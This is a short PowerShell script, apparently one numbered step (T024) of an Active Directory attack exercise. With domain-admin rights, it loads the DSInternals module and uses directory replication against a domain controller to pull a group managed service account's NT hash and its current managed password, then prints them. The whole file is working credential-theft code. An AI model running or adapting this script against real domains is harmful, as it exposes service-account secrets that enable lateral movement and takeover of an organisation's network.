# T024 — read gMSA current password via DSInternals Get-ADReplAccount (DA on dc01)
$ErrorActionPreference = 'Continue'
$tools = 'C:\Windows\Temp\cadre-tools'
$zip = Join-Path $tools 'DSInternals_v4.7.zip'
$dst = Join-Path $tools 'DSInternals_v4.7'
if (-not (Test-Path "$dst\DSInternals.psd1")) {
  Expand-Archive -Force $zip $dst
}
Import-Module "$dst\DSInternals.psd1" -Force -ErrorAction SilentlyContinue
Write-Output "DSINTERNALS_LOADED"
try {
  $acct = Get-ADReplAccount -SamAccountName 'gmsaTools$' -Domain 'cadre.local' -DomainController 'dc01.cadre.local' -ErrorAction Stop
  Write-Output "GMSA_SID $($acct.Sid)"
  Write-Output "GMSA_UPN $($acct.UserPrincipalName)"
  $pw = $acct.NTHash
  Write-Output "NTHASH $([BitConverter]::ToString($pw).Replace('-',''))"
  # ManagedPassword current
  $mp = $acct.ManagedPassword
  if ($mp) {
    Write-Output "CUR_PW_LEN $($mp.CurrentPassword.Length)"
    Write-Output "CUR_PW $($mp.CurrentPassword)"
  } else {
    Write-Output "NO_MANAGED_PW"
  }
} catch {
  Write-Output "REPL_ERR $($_.Exception.Message)"
}
Write-Output 'T024_CHK_DONE'
